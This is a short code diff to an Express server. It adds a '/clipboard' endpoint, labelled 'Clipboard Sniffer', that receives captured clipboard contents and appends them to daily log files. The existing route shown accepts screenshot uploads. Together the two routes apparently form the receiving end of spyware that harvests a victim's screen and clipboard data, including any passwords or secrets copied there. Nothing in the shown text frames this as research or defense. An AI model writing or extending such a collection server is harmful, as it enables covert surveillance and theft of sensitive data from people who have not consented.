@@ -61,6 +61,20 @@ app.post("/upload", upload.single("screenshot"), (req, res) => {
   res.send("Screenshot uploaded successfully.");
 });
 
+// POST from Clipboard Sniffer
+app.post("/clipboard", (req, res) => {
+  const time = req.body.timestamp || "Unknown Time";
+  const data = req.body.clipboardData || "";
+
+  const logDate = new Date().toISOString().split("T")[0];
+  const logFilename = `clipboard_capture_${logDate}.txt`;
+
+  console.log(`[CLIPBOARD] ${time} - ${data}`);
+  fs.appendFileSync(logFilename, `${time} - ${data}\n`);
+
+  res.send("Clipboard data received.");
+});
+
 // === Start Server ===
 app.listen(port, "0.0.0.0", () => {
   console.log(`✅ Server running at http://localhost:${port}`);
